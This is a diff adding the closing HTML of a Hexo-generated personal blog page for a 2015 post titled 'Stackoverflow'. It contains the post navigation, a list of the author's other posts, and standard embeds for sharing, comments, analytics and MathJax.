+            <li id="bds_weixin"><a href="#" class="bds_weixin" data-cmd="weixin" title="生成文章二维码"></a></li>
+            <li id="bds_more"><a href="#" class="bds_more" data-cmd="more"></i></a></li>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"Stackoverflow　| Song Li(Seanlee) Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="2015/03/05/Stackoverflow/" data-title="Stackoverflow" data-url="http://blog.songli.us/2015/03/05/Stackoverflow/"></div>
+    <!-- 多说评论框 end -->
+    <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+    <script type="text/javascript">
+    var duoshuoQuery = {short_name:"songlius"};
+    (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+         || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+    </script>
+    <!-- 多说公共JS代码 end -->
+</div>
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2015/03/06/2048/" title="Pre: 2048">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2015/02/23/U8681U7fa4U7b97U6cd5U53caU5176U5728U5217U8f66U89e3U4f53U987aU5e8fU7f16U6392U7684U5e94U7528/" title="Next: 蚁群算法及其在列车解体顺序编排的应用">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/10/02/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/15/convert-sorted-list-to-binary-search-tree/">convert sorted list to binary search tree</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/06/all-in-one-figure/">all in one figure</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/02/With-or-Without-Antialiasing/">With or Without Antialiasing</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/12/Gradient-Experiment-about-textures/">Gradient Experiment about textures</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/26/2016-4-26/">2016_4_26</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/24/Get-Edge-And-Subtract/">Get Edge And Subtract</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/Try-to-use-Alpha/">Try to use Alpha</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/26/Feb2528/">Feb25-28</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/02/PianosheetofDeborahsTheme/">Piano sheet of Deborah's Theme</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/26/leetcodeMissingNumber/">leetcode Missing Number</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/26/leetcodeUglyNumberII/">leetcode Ugly Number II</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/21/TowerofHanoi/">Tower of Hanoi</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/20/HeapinsertionanddeletioninC/">Heap insertion and deletion in C</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/20/verybasichashtable/">Very basic hashtable</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/17/Quicksort/">Quicksort</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/17/Heapsort/">Heapsort</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/17/DistanceCalculatorGUI/">Distance Calculator GUI</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/16/SortListusemergesort/">Sort List use merge sort</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/07/Matrixinvert/">Matrix invert</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/06/SimpleNetwork/">Simple Network</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/Myfmt/">Myfmt</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/06/07/MaximalSquare/">Maximal Square</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/06/07/CountCompleteTreeNodes/">Count Complete Tree Nodes</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/31/U6dd8U5b9dU7a0bU5e8fU5458U7684U7ecfU5386/">淘宝程序员的经历</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/04/05/U6700U5c0fU5272/">最小割</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/03/23/U5230U53d1U7ebfU8bbeU8ba1U9057U4f20U7b97U6cd5/">到发线设计遗传算法</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/03/06/2048/">2048</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/03/05/Stackoverflow/">Stackoverflow</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/23/U8681U7fa4U7b97U6cd5U53caU5176U5728U5217U8f66U89e3U4f53U987aU5e8fU7f16U6392U7684U5e94U7528/">蚁群算法及其在列车解体顺序编排的应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/09/IRST/">IRST</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/03/Minimumdominatingset/">Minimum Dominating Set</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/13/ab/">a+b</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/11/01/U79cb/">秋</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/10/31/exeprogram/">exe程序捆绑运行的设计实现</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/10/27/U6495U626fU81eaU5df1/">撕扯自己</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/02/06/U796dU5960/">祭奠</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2018 Song Li
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >Site Visitors: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">Page Hits: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-74687031-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
